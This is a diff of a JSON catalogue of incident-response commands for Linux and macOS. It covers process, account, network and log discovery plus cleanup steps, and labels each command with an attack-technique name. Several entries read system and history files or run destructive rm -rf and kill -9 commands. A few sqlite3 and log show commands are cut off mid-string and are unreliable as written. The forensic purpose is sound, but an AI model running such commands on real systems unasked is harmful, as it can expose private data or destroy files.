+      "output": "File: /bin/bash\\nSize: 1234567\\nAccess: 2025-10-23 14:00:00\\nModify: 2025-10-23 14:00:00",
+      "technique": "File Discovery"
+    },
+    {
+      "title": "Show group memberships (privilege review)",
+      "command": "cat /etc/group",
+      "desc": "Discovers group and sudo/admin memberships for lateral movement and privilege escalation.",
+      "example": "cat /etc/group",
+      "technique": "Account Discovery",
+      "output": "sudo:x:27:user1,analyst\nadm:x:4:user1,syslog"
+    },
+    {
+      "title": "Show last boot log",
+      "command": "cat /var/log/boot.log | tail -n 10",
+      "desc": "Check for boot errors, crash evidence.",
+      "example": "cat /var/log/boot.log",
+      "technique": "Event Log Discovery",
+      "output": "Started Update UTMP about System Boot/Shutdown.\nFinished Raise network interfaces."
+    },
+    {
+      "title": "Show last login for each user",
+      "command": "lastlog",
+      "desc": "When was the last successful login for every account?",
+      "example": "lastlog",
+      "technique": "Account Discovery",
+      "output": "Username         Port     From             Latest\nroot             pts/0    192.168.1.2      Fri Oct 17 09:23:11 +0000 2025"
+    },
+    {
+      "title": "Show listening connections",
+      "command": "ss -tuln",
+      "desc": "Show listening TCP/UDP ports",
+      "example": "ss -tuln",
+      "output": "Netid State  Recv-Q Send-Q Local Address:Port\\ntcp   LISTEN 0      128    0.0.0.0:22",
+      "technique": "Network Connection Discovery"
+    },
+    {
+      "title": "Show loaded kernel modules",
+      "command": "lsmod",
+      "desc": "Lists all loaded modules; rootkits and hardware support.",
+      "example": "lsmod",
+      "technique": "Kernel Module Discovery",
+      "output": "Module                  Size  Used by\next4                  487424  1"
+    },
+    {
+      "title": "Show logged users",
+      "command": "who",
+      "desc": "Display currently logged in users",
+      "example": "who",
+      "output": "root     tty1         2025-10-23 14:30\\nuser1    pts/0        2025-10-23 14:35",
+      "technique": "Account Discovery"
+    },
+    {
+      "title": "Show login/logout history (timeline)",
+      "command": "last",
+      "desc": "Shows when each user/session last logged on/off. Includes SSH, local, and reboot.",
+      "example": "last",
+      "technique": "Logon Session Discovery",
+      "output": "user1  pts/0        2025-10-16 07:22   still logged in\nreboot system boot  2025-10-15 07:19"
+    },
+    {
+      "title": "Show open files for a process",
+      "command": "lsof -p [PID]",
+      "desc": "See what files, sockets etc., a process is using. Correlate with malware or data theft.",
+      "example": "lsof -p 1053",
+      "technique": "File and Directory Discovery",
+      "output": "COMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF  NODE NAME\nsshd      1053 root  3u  IPv4  6947      0t0    TCP *:22 (LISTEN)"
+    },
+    {
+      "title": "Show process tree (parent-child linkage)",
+      "command": "pstree -p",
+      "desc": "Hierarchical view of processesâ€”find suspicious parents, injected code, etc.",
+      "example": "pstree -p",
+      "technique": "Process Discovery",
+      "output": "systemd(1)â”€sshd(766)â”€bash(2013)â”€pstree(2089)"
+    },
+    {
+      "title": "Show recent authentication logins/errors",
+      "command": "cat /var/log/auth.log | tail -n 10",
+      "desc": "View authentication attempts, failed logins, sudo requests.",
+      "example": "cat /var/log/auth.log",
+      "technique": "Authentication Discovery",
+      "output": "Oct 17 10:44:14 server sshd[1227]: Accepted password for user1 from 192.168.1.50 port 54012 ssh2\nOct 17 10:45:02 server su[1332]: pam_unix(su-l:session): session opened for user root"
+    },
+    {
+      "title": "Show root/system-wide crontab",
+      "command": "cat /etc/crontab",
+      "desc": "System-wide scheduled tasks. Look for privileged malware tasks.",
+      "example": "cat /etc/crontab",
+      "technique": "Persistence via Scheduled Task",
+      "output": "0 2 * * * root /usr/local/bin/backup.sh\n* * * * * root /tmp/maliciousTask.sh"
+    },
+    {
+      "title": "Show running processes",
+      "command": "ps aux",
+      "desc": "List all running processes",
+      "example": "ps aux",
+      "output": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\\nroot         1  0.0  0.1  16000  2000 ?        Ss   14:00   0:01 /sbin/init",
+      "technique": "Process Discovery"
+    },
+    {
+      "title": "Show services (systemd)",
+      "command": "systemctl list-units --type=service",
+      "desc": "List all systemd services",
+      "example": "systemctl list-units --type=service",
+      "output": "UNIT                     LOAD   ACTIVE SUB     DESCRIPTION\\nsshd.service            loaded active running OpenSSH server",
+      "technique": "Service Discovery"
+    },
+    {
+      "title": "Show startup programs",
+      "command": "ls -la /etc/init.d/; systemctl list-unit-files --type=service --state=enabled",
+      "desc": "List startup scripts and enabled services",
+      "example": "systemctl list-unit-files --state=enabled",
+      "output": "sshd.service      enabled\\nnginx.service     enabled",
+      "technique": "Boot or Logon Autostart"
+    },
+    {
+      "title": "Show the ARP table (local devices)",
+      "command": "arp -a",
+      "desc": "Find devices on the same network segmentâ€”may be involved in lateral movement or attack.",
+      "example": "arp -a",
+      "technique": "Network Discovery",
+      "output": "router (192.168.1.1) at aa:bb:cc:dd:ee:ff [ether] on eth0"
+    },
+    {
+      "title": "Terminate network connection",
+      "command": "sudo ss -K dst <ip>",
+      "desc": "Kill connections to specific IP",
+      "example": "sudo ss -K dst 10.0.0.5",
+      "output": "",
+      "technique": "Network Blocking"
+    },
+    {
+      "title": "View user properties",
+      "command": "id <username>",
+      "desc": "Display user ID and group information",
+      "example": "id root",
+      "output": "uid=0(root) gid=0(root) groups=0(root)",
+      "technique": "Account Discovery"
     }
   ],
   "mac": [
-    {
-      "title": "Display macOS version and build info",
-      "command": "sw_vers",
-      "desc": "Identifies OS version for vulnerability assessment and timeline establishment.",
-      "example": "sw_vers",
-      "technique": "System Information Discovery"
-    },
-    {
-      "title": "Show system uptime and last boot time",
-      "command": "uptime",
-      "desc": "Determines if system was rebooted during incident timeframe - crucial for timeline analysis.",
-      "example": "uptime",
-      "technique": "System Information Discovery"
-    },
-    {
-      "title": "Get full hardware info (inc. serial number)",
-      "command": "system_profiler SPHardwareDataType",
-      "desc": "Unique device identification and hardware configuration documentation.",
-      "example": "system_profiler SPHardwareDataType",
-      "technique": "System Information Discovery"
-    },
-    {
-      "title": "List ALL user accounts (inc. hidden/system)",
-      "command": "dscl . list /Users",
-      "desc": "Identifies all local user accounts including hidden accounts attackers may create.",
-      "example": "dscl . list /Users",
-      "technique": "Valid Accounts"
-    },
-    {
-      "title": "Show user login history (timeline)",
-      "command": "last | head -20",
-      "desc": "Historical login recordsâ€”timeline analysis & unauthorized access.",
-      "example": "last | head -20",
-      "technique": "Valid Accounts"
-    },
-    {
-      "title": "List currently logged-in users/activity",
-      "command": "w",
-      "desc": "Shows active user sessions and commands running during live forensics.",
-      "example": "w",
-      "technique": "Valid Accounts"
-    },
-    {
-      "title": "Get detailed info on user account",
-      "command": "dscl . read /Users/username",
-      "desc": "User profile details, home directory, shell type, UID.",
-      "example": "dscl . read /Users/admin",
-      "technique": "Valid Accounts"
-    },
     {
       "title": "All running processes (detailed view)",
       "command": "ps aux",
@@ -642,46 +1250,82 @@
       "technique": "Process Discovery"
     },
     {
-      "title": "Process hierarchy/parent-child tree",
-      "command": "ps -axo user,pid,ppid,%cpu,%mem,start,time,command",
-      "desc": "Process tree analysis to identify malicious chains.",
-      "example": "ps -axo user,pid,ppid,%cpu,%mem,start,time,command",
-      "technique": "Process Discovery"
-    },
-    {
-      "title": "Find resource-intensive processes (cryptominer check)",
-      "command": "top -l 1 -n 10",
-      "desc": "Spot CPU/memory abuse (e.g., crypto miner/malware).",
-      "example": "top -l 1 -n 10",
-      "technique": "Process Discovery"
-    },
-    {
-      "title": "List all launch agents/daemons (persistence)",
-      "command": "launchctl list",
-      "desc": "Identifies persistence mechanisms, suspicious/rogue launch/agent services.",
-      "example": "launchctl list | grep -v com.apple",
+      "title": "Check for root/boot LaunchDaemons",
+      "command": "sudo ls -la /Library/LaunchDaemons",
+      "desc": "System daemons running with root.",
+      "example": "sudo ls -la /Library/LaunchDaemons",
       "technique": "Persistence"
     },
     {
-      "title": "Display all active network connections",
-      "command": "netstat -an | grep ESTABLISHED",
-      "desc": "Active connections to possible C2/malicious IPs.",
-      "example": "netstat -an | grep ESTABLISHED",
-      "technique": "Network Connection Discovery"
+      "title": "Check for user-level LaunchAgents",
+      "command": "ls -la ~/Library/LaunchAgents",
+      "desc": "Persistence running on user login.",
+      "example": "ls -la ~/Library/LaunchAgents",
+      "technique": "Persistence"
     },
     {
-      "title": "Map which process owns network connections",
-      "command": "lsof -i -P -n",
-      "desc": "Maps processes to network connections (spot malware traffic).",
-      "example": "lsof -i -P -n",
-      "technique": "Network Connection Discovery"
+      "title": "Delete LaunchAgent",
+      "command": "launchctl unload <plist>; rm <plist>",
+      "desc": "Unload and delete LaunchAgent",
+      "example": "launchctl unload ~/Library/LaunchAgents/com.malware.plist; rm ~/Library/LaunchAgents/com.malware.plist",
+      "output": "",
+      "technique": "Defense Evasion"
     },
     {
-      "title": "Find process using specific port",
-      "command": "lsof -i :8080",
-      "desc": "Identifies unauthorized services/malware listeners.",
-      "example": "lsof -i :8080",
-      "technique": "Network Connection Discovery"
+      "title": "Delete cron job",
+      "command": "crontab -e",
+      "desc": "Edit crontab to remove entries",
+      "example": "crontab -e",
+      "output": "# Remove line and save",
+      "technique": "Defense Evasion"
+    },
+    {
+      "title": "Delete file including hidden",
+      "command": "rm -f <filepath>",
+      "desc": "Force delete file",
+      "example": "rm -f /tmp/malware",
+      "output": "",
+      "technique": "File Deletion"
+    },
+    {
+      "title": "Delete folder including hidden",
+      "command": "rm -rf <folderpath>",
+      "desc": "Recursively force delete folder",
+      "example": "rm -rf /tmp/malware_folder",
+      "output": "",
+      "technique": "File Deletion"
+    },
+    {
+      "title": "Delete service",
+      "command": "sudo launchctl unload <plist>; sudo rm <plist>",
+      "desc": "Unload and remove LaunchAgent/Daemon",
+      "example": "sudo launchctl unload /Library/LaunchDaemons/com.malware.plist",
+      "output": "",
+      "technique": "Defense Evasion"
+    },
+    {
+      "title": "Delete startup program",
+      "command": "sudo rm -rf /Library/StartupItems/<name>",
+      "desc": "Remove startup item",
+      "example": "sudo rm -rf /Library/StartupItems/Malware.app",
+      "output": "",
+      "technique": "Defense Evasion"
+    },
+    {
+      "title": "Disable domain user",
+      "command": "sudo dscl /Active\\\\ Directory/<domain>/All\\\\ Domains -create /Users/<username> AuthenticationAuthority ;DisabledUser;",
+      "desc": "Disable domain user",
+      "example": "sudo dscl /Active\\\\ Directory/example.com/All\\\\ Domains -create /Users/jdoe AuthenticationAuthority ;DisabledUser;",
+      "output": "",
+      "technique": "Account Management"
+    },
+    {
+      "title": "Disable local user",
+      "command": "sudo dscl . create /Users/<username> AuthenticationAuthority ;DisabledUser;",
+      "desc": "Disable local user account",
+      "example": "sudo dscl . create /Users/user1 AuthenticationAuthority ;DisabledUser;",
+      "output": "",
+      "technique": "Account Management"
     },
     {
       "title": "Display ARP cache",
@@ -691,6 +1335,35 @@
       "technique": "Network Discovery"
     },
     {
+      "title": "Display all active network connections",
+      "command": "netstat -an | grep ESTABLISHED",
+      "desc": "Active connections to possible C2/malicious IPs.",
+      "example": "netstat -an | grep ESTABLISHED",
+      "technique": "Network Connection Discovery"
+    },
+    {
+      "title": "Display macOS version and build info",
+      "command": "sw_vers",
+      "desc": "Identifies OS version for vulnerability assessment and timeline establishment.",
+      "example": "sw_vers",
+      "technique": "System Information Discovery"
+    },
+    {
+      "title": "Enable local user",
+      "command": "sudo dscl . delete /Users/<username> AuthenticationAuthority",
+      "desc": "Enable local user by removing disabled flag",
+      "example": "sudo dscl . delete /Users/user1 AuthenticationAuthority",
+      "output": "",
+      "technique": "Account Management"
+    },
+    {
+      "title": "Extract Safari browsing history (SQLite)",
+      "command": "sqlite3 ~/Library/Safari/History.db \\",
+      "desc": "Full Safari browsing history, timestamps.",
+      "example": "sqlite3 ~/Library/Safari/History.db \\",
+      "technique": "Browser Activity Discovery"
+    },
+    {
       "title": "Find files modified last 7 days (timeline)",
       "command": "find /Users -type f -mtime -7 -ls",
       "desc": "Spot recently modified files during incident.",
@@ -698,11 +1371,272 @@
       "technique": "File Modification Discovery"
     },
     {
+      "title": "Find process using specific port",
+      "command": "lsof -i :8080",
+      "desc": "Identifies unauthorized services/malware listeners.",
+      "example": "lsof -i :8080",
+      "technique": "Network Connection Discovery"
+    },
+    {
+      "title": "Find resource-intensive processes (cryptominer check)",
+      "command": "top -l 1 -n 10",
+      "desc": "Spot CPU/memory abuse (e.g., crypto miner/malware).",
+      "example": "top -l 1 -n 10",
+      "technique": "Process Discovery"
+    },
+    {
       "title": "Full file metadata (MAC timestamps)",
       "command": "stat filename",
       "desc": "Complete MAC times (Modified, Accessed, Changed) + Birth time.",
       "example": "stat /tmp/suspicious.sh",
       "technique": "File Modification Discovery"
+    },
+    {
+      "title": "Get IP and hostname",
+      "command": "ifconfig; hostname",
+      "desc": "Display IP addresses and hostname",
+      "example": "ifconfig; hostname",
+      "output": "en0: flags=8863<UP,BROADCAST,SMART,RUNNING>\\ninet 192.168.1.10 netmask 0xffffff00\\nMacBook-Pro.local",
+      "technique": "System Network Configuration"
+    },
+    {
+      "title": "Get detailed info on user account",
+      "command": "dscl . read /Users/username",
+      "desc": "User profile details, home directory, shell type, UID.",
+      "example": "dscl . read /Users/admin",
+      "technique": "Valid Accounts"
+    },
+    {
+      "title": "Get full hardware info (inc. serial number)",
+      "command": "system_profiler SPHardwareDataType",
+      "desc": "Unique device identification and hardware configuration documentation.",
+      "example": "system_profiler SPHardwareDataType",
+      "technique": "System Information Discovery"
+    },
+    {
+      "title": "Get user SID (UID)",
+      "command": "id -u <username>",
+      "desc": "Get user ID",
+      "example": "id -u admin",
+      "output": "501",
+      "technique": "Account Discovery"
+    },
+    {
+      "title": "Kill process",
+      "command": "kill -9 <pid>",
+      "desc": "Force kill process by PID",
+      "example": "kill -9 1234",
+      "output": "",
+      "technique": "Process Termination"
+    },
+    {
+      "title": "List ALL user accounts (inc. hidden/system)",
+      "command": "dscl . list /Users",
+      "desc": "Identifies all local user accounts including hidden accounts attackers may create.",
+      "example": "dscl . list /Users",
+      "technique": "Valid Accounts"
+    },
+    {
+      "title": "List all launch agents/daemons (persistence)",
+      "command": "launchctl list",
+      "desc": "Identifies persistence mechanisms, suspicious/rogue launch/agent services.",
+      "example": "launchctl list | grep -v com.apple",
+      "technique": "Persistence"
+    },
+    {
+      "title": "List currently logged-in users/activity",
+      "command": "w",
+      "desc": "Shows active user sessions and commands running during live forensics.",
+      "example": "w",
+      "technique": "Valid Accounts"
+    },
+    {
+      "title": "List files including hidden",
+      "command": "ls -la <path>",
+      "desc": "List all files including hidden",
+      "example": "ls -la /Users/admin",
+      "output": "drwx------  10 admin  staff   320 Oct 23 14:00 .\\n-rw-r--r--   1 admin  staff   123 Oct 23 14:00 .bash_profile",
+      "technique": "File Discovery"
+    },
+    {
+      "title": "List users",
+      "command": "dscl . list /Users",
+      "desc": "List all user accounts",
+      "example": "dscl . list /Users",
+      "output": "_analyst\\n_appinstaller\\nadmin\\nuser1",
+      "technique": "Account Discovery"
+    },
+    {
+      "title": "Live monitor filesystem activity",
+      "command": "sudo fs_usage -f filesys",
+      "desc": "Live monitoring of read/write/del file operations.",
+      "example": "sudo fs_usage -f filesys",
+      "technique": "File Modification Discovery"
+    },
+    {
+      "title": "Logoff user",
+      "command": "sudo launchctl bootout user/<uid>",
+      "desc": "Force logoff user by UID",
+      "example": "sudo launchctl bootout user/501",
+      "output": "",
+      "technique": "Account Management"
+    },
+    {
+      "title": "Map which process owns network connections",
+      "command": "lsof -i -P -n",
+      "desc": "Maps processes to network connections (spot malware traffic).",
+      "example": "lsof -i -P -n",
+      "technique": "Network Connection Discovery"
+    },
+    {
+      "title": "Process hierarchy/parent-child tree",
+      "command": "ps -axo user,pid,ppid,%cpu,%mem,start,time,command",
+      "desc": "Process tree analysis to identify malicious chains.",
+      "example": "ps -axo user,pid,ppid,%cpu,%mem,start,time,command",
+      "technique": "Process Discovery"
+    },
+    {
+      "title": "Query Chrome browsing history (SQLite)",
+      "command": "sqlite3 ~/Library/Application\\\\ Support/Google/Chrome/Default/History \\",
+      "desc": "Full Chrome browsing history/visits.",
+      "example": "sqlite3 ~/Library/Application\\\\ Support/Google/Chrome/Default/History \\",
+      "technique": "Browser Activity Discovery"
+    },
+    {
+      "title": "Query Unified Log for process",
+      "command": "log show --predicate 'process == \\",
+      "desc": "Track specific process activity, behavior patterns.",
+      "example": "log show --predicate 'process == \\",
+      "technique": "Event Log Discovery"
+    },
+    {
+      "title": "Resolve hostname from IP",
+      "command": "nslookup <ipaddress>",
+      "desc": "Resolve IP to hostname",
+      "example": "nslookup 8.8.8.8",
+      "output": "Server:  8.8.8.8\\nName:    dns.google",
+      "technique": "Network Discovery"
+    },
+    {
+      "title": "Show Launch Agents/Daemons locations",
+      "command": "ls -la [path]",
+      "desc": "Persistence: check user/system LaunchAgents/LaunchDaemons.",
+      "example": "ls -la ~/Library/LaunchAgents",
+      "technique": "Persistence"
+    },
+    {
+      "title": "Show LaunchAgents (scheduled)",
+      "command": "ls -la ~/Library/LaunchAgents; ls -la /Library/LaunchAgents; ls -la /Library/LaunchDaemons",
+      "desc": "List all LaunchAgents and LaunchDaemons",
+      "example": "ls -la /Library/LaunchAgents",
+      "output": "-rw-r--r--  1 root  wheel  456 Oct 23 14:00 com.example.agent.plist",
+      "technique": "Scheduled Task Discovery"
+    },
+    {
+      "title": "Show Safari downloads (plist)",
+      "command": "plutil -p ~/Library/Safari/Downloads.plist",
+      "desc": "Safari download history with URLs, timestamps.",
+      "example": "plutil -p ~/Library/Safari/Downloads.plist",
+      "technique": "File Discovery"
+    },
+    {
+      "title": "Show authentication-related events",
+      "command": "log show --predicate 'eventMessage contains \\",
+      "desc": "Login attempts, successes, failures (security analysis).",
+      "example": "log show --predicate 'eventMessage contains \\",
+      "technique": "Authentication Discovery"
+    },
+    {
+      "title": "Show cron jobs",
+      "command": "crontab -l",
+      "desc": "List user's cron jobs",
+      "example": "crontab -l",
+      "output": "0 * * * * /Users/admin/backup.sh",
+      "technique": "Scheduled Task Discovery"
+    },
+    {
+      "title": "Show established connections",
+      "command": "lsof -iTCP -sTCP:ESTABLISHED -n -P",
+      "desc": "Show established TCP connections",
+      "example": "lsof -iTCP -sTCP:ESTABLISHED -n -P",
+      "output": "COMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME\\nChrome    456 user   10u  IPv4  23456      0t0  TCP 192.168.1.10:51234->10.0.0.5:443 (ESTABLISHED)",
+      "technique": "Network Connection Discovery"
+    },
+    {
+      "title": "Show file properties",
+      "command": "stat <filepath>",
+      "desc": "Display detailed file information",
+      "example": "stat /bin/bash",
+      "output": "File: /bin/bash\\nSize: 1234567\\nAccess: Oct 23 14:00:00 2025\\nModify: Oct 23 14:00:00 2025",
+      "technique": "File Discovery"
+    },
+    {
+      "title": "Show listening connections",
+      "command": "lsof -iTCP -sTCP:LISTEN -n -P",
+      "desc": "Show listening TCP connections",
+      "example": "lsof -iTCP -sTCP:LISTEN -n -P",
+      "output": "COMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME\\nsshd      123 root    3u  IPv4  12345      0t0  TCP *:22 (LISTEN)",
+      "technique": "Network Connection Discovery"
+    },
+    {
+      "title": "Show logged users",
+      "command": "who",
+      "desc": "Display currently logged in users",
+      "example": "who",
+      "output": "admin    console  Oct 23 14:30\\nuser1    ttys000  Oct 23 14:35",
+      "technique": "Account Discovery"
+    },
+    {
+      "title": "Show recent bash shell history",
+      "command": "cat ~/.bash_history | tail -50",
+      "desc": "Command history for attacker/antiforensic activity.",
+      "example": "cat ~/.bash_history | tail -50",
+      "technique": "Command and Script Execution"
+    },
+    {
+      "title": "Show running processes",
+      "command": "ps aux",
+      "desc": "List all running processes",
+      "example": "ps aux",
+      "output": "USER     PID  %CPU %MEM      VSZ    RSS   TT  STAT STARTED      TIME COMMAND\\nroot       1   0.0  0.1  4567890  12345   ??  Ss   14:00     0:01.23 /sbin/launchd",
+      "technique": "Process Discovery"
+    },
+    {
+      "title": "Show services (LaunchAgents)",
+      "command": "launchctl list",
+      "desc": "List all running services and agents",
+      "example": "launchctl list",
+      "output": "PID    Status  Label\\n123    0       com.apple.loginwindow\\n456    0       com.example.service",
+      "technique": "Service Discovery"
+    },
+    {
+      "title": "Show startup programs",
+      "command": "ls -la /Library/StartupItems; ls -la ~/Library/LaunchAgents",
+      "desc": "List startup items and login agents",
+      "example": "ls -la /Library/StartupItems",
+      "output": "drwxr-xr-x  3 root  wheel  96 Oct 23 14:00 StartupItem.app",
+      "technique": "Boot or Logon Autostart"
+    },
+    {
+      "title": "Show system uptime and last boot time",
+      "command": "uptime",
+      "desc": "Determines if system was rebooted during incident timeframe - crucial for timeline analysis.",
+      "example": "uptime",
+      "technique": "System Information Discovery"
+    },
+    {
+      "title": "Show user login history (timeline)",
+      "command": "last | head -20",
+      "desc": "Historical login recordsâ€”timeline analysis & unauthorized access.",
+      "example": "last | head -20",
+      "technique": "Valid Accounts"
+    },
+    {
+      "title": "Show zsh shell history (with timestamps)",
+      "command": "cat ~/.zsh_history",
+      "desc": "Command+timestamp; better for timeline.",
+      "example": "cat ~/.zsh_history",
+      "technique": "Command and Script Execution"
     },
     {
       "title": "Spotlight: search for files by metadata",
@@ -719,25 +1653,19 @@
       "technique": "File Discovery"
     },
     {
-      "title": "Live monitor filesystem activity",
-      "command": "sudo fs_usage -f filesys",
-      "desc": "Live monitoring of read/write/del file operations.",
-      "example": "sudo fs_usage -f filesys",
-      "technique": "File Modification Discovery"
+      "title": "Stream live system logs (debug)",
+      "command": "log stream --level debug",
+      "desc": "Real-time log stream; all system/app events.",
+      "example": "log stream --level debug",
+      "technique": "Event Log Discovery"
     },
     {
-      "title": "Show recent bash shell history",
-      "command": "cat ~/.bash_history | tail -50",
-      "desc": "Command history for attacker/antiforensic activity.",
-      "example": "cat ~/.bash_history | tail -50",
-      "technique": "Command and Script Execution"
-    },
-    {
-      "title": "Show zsh shell history (with timestamps)",
-      "command": "cat ~/.zsh_history",
-      "desc": "Command+timestamp; better for timeline.",
-      "example": "cat ~/.zsh_history",
-      "technique": "Command and Script Execution"
+      "title": "Terminate network connection",
+      "command": "sudo lsof -iTCP@<ip> -sTCP:ESTABLISHED -t | sudo xargs kill -9",
+      "desc": "Kill connections to specific IP",
+      "example": "sudo lsof -iTCP@10.0.0.5 -sTCP:ESTABLISHED -t | sudo xargs kill -9",
+      "output": "",
+      "technique": "Network Blocking"
     },
     {
       "title": "Unified Log (last hour, filter by keyword)",
@@ -747,67 +1675,20 @@
       "technique": "Event Log Discovery"
     },
     {
-      "title": "Query Unified Log for process",
-      "command": "log show --predicate 'process == \\",
-      "desc": "Track specific process activity, behavior patterns.",
-      "example": "log show --predicate 'process == \\",
-      "technique": "Event Log Discovery"
+      "title": "View domain user properties",
+      "command": "dscl /Active\\\\ Directory/<domain>/All\\\\ Domains -read /Users/<username>",
+      "desc": "View domain user properties",
+      "example": "dscl /Active\\\\ Directory/example.com/All\\\\ Domains -read /Users/jdoe",
+      "output": "dsAttrTypeNative:sAMAccountName: jdoe\\nRealName: John Doe",
+      "technique": "Account Discovery"
     },
     {
-      "title": "Show authentication-related events",
-      "command": "log show --predicate 'eventMessage contains \\",
-      "desc": "Login attempts, successes, failures (security analysis).",
-      "example": "log show --predicate 'eventMessage contains \\",
-      "technique": "Authentication Discovery"
-    },
-    {
-      "title": "Stream live system logs (debug)",
-      "command": "log stream --level debug",
-      "desc": "Real-time log stream; all system/app events.",
-      "example": "log stream --level debug",
-      "technique": "Event Log Discovery"
-    },
-    {
-      "title": "Extract Safari browsing history (SQLite)",
-      "command": "sqlite3 ~/Library/Safari/History.db \\",
-      "desc": "Full Safari browsing history, timestamps.",
-      "example": "sqlite3 ~/Library/Safari/History.db \\",
-      "technique": "Browser Activity Discovery"
-    },
-    {
-      "title": "Query Chrome browsing history (SQLite)",
-      "command": "sqlite3 ~/Library/Application\\\\ Support/Google/Chrome/Default/History \\",
-      "desc": "Full Chrome browsing history/visits.",
-      "example": "sqlite3 ~/Library/Application\\\\ Support/Google/Chrome/Default/History \\",
-      "technique": "Browser Activity Discovery"
-    },
-    {
-      "title": "Show Safari downloads (plist)",
-      "command": "plutil -p ~/Library/Safari/Downloads.plist",
-      "desc": "Safari download history with URLs, timestamps.",
-      "example": "plutil -p ~/Library/Safari/Downloads.plist",
-      "technique": "File Discovery"
-    },
-    {
-      "title": "Show Launch Agents/Daemons locations",
-      "command": "ls -la [path]",
-      "desc": "Persistence: check user/system LaunchAgents/LaunchDaemons.",
-      "example": "ls -la ~/Library/LaunchAgents",
-      "technique": "Persistence"
-    },
-    {
-      "title": "Check for user-level LaunchAgents",
-      "command": "ls -la ~/Library/LaunchAgents",
-      "desc": "Persistence running on user login.",
-      "example": "ls -la ~/Library/LaunchAgents",
-      "technique": "Persistence"
-    },
-    {
-      "title": "Check for root/boot LaunchDaemons",
-      "command": "sudo ls -la /Library/LaunchDaemons",
-      "desc": "System daemons running with root.",
-      "example": "sudo ls -la /Library/LaunchDaemons",
-      "technique": "Persistence"
+      "title": "View user properties",
+      "command": "id <username>",
+      "desc": "Display user ID and group information",
+      "example": "id admin",
+      "output": "uid=501(admin) gid=20(staff) groups=20(staff),80(admin)",
+      "technique": "Account Discovery"
     }
   ]
 }
